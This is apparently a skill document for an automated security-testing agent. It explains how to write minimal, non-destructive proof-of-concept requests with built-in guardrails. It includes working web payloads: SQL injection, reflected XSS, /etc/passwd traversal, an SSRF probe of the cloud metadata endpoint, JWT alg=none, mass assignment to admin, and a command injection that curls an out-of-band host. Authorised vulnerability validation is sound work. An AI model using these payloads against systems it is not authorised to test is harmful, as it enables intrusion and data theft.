---
name: poc-drafting
description: |
  How the validator drafts proof-of-concept HTTP requests for DAST
  confirmation. PoCs must be minimal, non-destructive, and reproducible.
  Use OOB tokens for blind cases. Never POST destructive payloads to a
  production-like system without manifest allow-listing.
when_to_use:
  - Validator is moving a hypothesis from static reasoning to a live HTTP confirmation.
  - You need to confirm a blind injection and require an OOB token.
  - You are tempted to fire a destructive payload at a target — stop and re-read this skill first.
---

# PoC drafting

A proof-of-concept request is what turns a hypothesis into a finding. It
must demonstrate the capability without exercising the destructive part of
it. The goal is *evidence*, not damage.

## Principles

1. **Minimal.** Smallest possible request that proves the primitive. Don't
   chain multiple things into one PoC — that defeats the validation loop.

2. **Non-destructive.** Use `GET` and read-only methods where possible.
   If a `POST` is necessary, choose a payload that demonstrates the issue
   without changing persistent state — e.g. trigger a server-side error
   that proves the parser is reached, rather than actually creating a record.

3. **Reproducible.** The PoC must be runnable as a single `http_request`
   call. Include all headers needed for the path to be reached.

4. **Observable.** The response must contain a clear signal of success.
   For reflected XSS, that's the payload appearing in the body. For SQLi,
   that's a specific error string or a measurable time delay. For blind
   cases, that's an OOB callback hit.

5. **OOB-first for blind cases.** Any time the response doesn't reveal
   exploit success directly (blind SQLi, blind RCE, SSRF), embed an
   `OOB_TOKEN` and poll for hits.

## PoC patterns by class

### SQLi (error-based)

Minimal: single quote, observe error.

```python
http_request(method="GET", url="<base>/search", params={"q": "'"})
```

Signal: response body contains DB error string ("SQL syntax", "ORA-",
"PostgreSQL ERROR", etc.). Or `status` jumps from 200 → 500.

### SQLi (time-based)

Use 5-second delay. Avoid > 10 seconds (server resource concern).

```python
http_request(..., params={"q": "1 OR SLEEP(5)--"})
```

Signal: `duration_ms` jumps by ~5000 vs baseline.

### XSS (reflected)

```python
http_request(..., params={"q": "lacxss<script>1</script>"})
```

Signal: `body_sample` contains the literal payload, unescaped.

### Command injection

Use OOB. Don't execute `id` if you don't need to.

```text
1. token, url = oob_callback_register(label="cmdi-confirm")
2. http_request(..., params={"name": f"x; curl http://{token}.oob.local/"})
3. wait 30s
4. oob_callback_poll(token=token) → expect at least one hit
```

### SSRF (with response body)

```python
http_request(method="GET", url="<base>/fetch?url=http://169.254.169.254/latest/meta-data/")
```

Signal: response body contains AMI ID or region string. NEVER actually fetch
the credentials endpoint without explicit authorization in the manifest.

### SSRF (blind)

OOB pattern. Embed token in the user-controlled URL.

### Path traversal

```python
http_request(..., params={"file": "../../../etc/passwd"})
```

Signal: response body contains `root:x:` or `daemon:`. Or a directory
listing if the endpoint is a static file server.

### Open redirect

```python
http_request(method="GET", url="<base>/login?next=https://lacuna-evil.example/")
```

Signal: response is 30x with `Location: https://lacuna-evil.example/` (or
the body contains such a redirect).

### IDOR

Need two user sessions. Use `auth_login` twice with different flow names.

```text
1. auth_login(flow_name="user-alice")
2. auth_login(flow_name="user-bob")
3. http_request(method="GET", url="<base>/api/orders/<alice's order id>", session="user-bob")
```

Signal: Bob's request returns Alice's order data with status 200.

### JWT alg=none

```text
1. Construct unsigned JWT manually: base64url("eyJhbGciOiJub25lIn0") + "." +
   base64url(claims) + "."
2. http_request(..., headers={"Authorization": f"Bearer {token}"})
```

Signal: response 200 (i.e. accepted) rather than 401.

### Mass assignment

```python
http_request(method="PUT", url="<base>/api/profile", session="ordinary-user",
              json_body={"email": "x@y.com", "role": "admin"})
```

Signal: subsequent GET to the profile shows `role: admin`.

## Safety guardrails

- **Always check `_check_target()` would pass** — the DAST server enforces
  the allowed-hosts list. If your target isn't on the list, get the manifest
  fixed before running.

- **Never write `POST`/`PUT`/`PATCH`/`DELETE` to production targets without
  manifest `safety.allowed_destructive_methods` permission.** The PreToolUse
  hook will deny it.

- **Do not chain multiple steps into one PoC.** Each PoC validates exactly
  one primitive. Compositions are the chain-builder's job.

- **Do not use real PII or production data in payloads.** Use synthetic
  values: `lacuna-test-{token}`, `lacuna-evil.example`, `1.2.3.4`.

- **Always materialize evidence.** The DAST server writes request+response
  to `/state/evidence/` automatically. After the PoC, call
  `kg.write.attach_evidence(finding_id=..., kind="http_trace",
  payload_path="/state/evidence/dast-http-...")`.
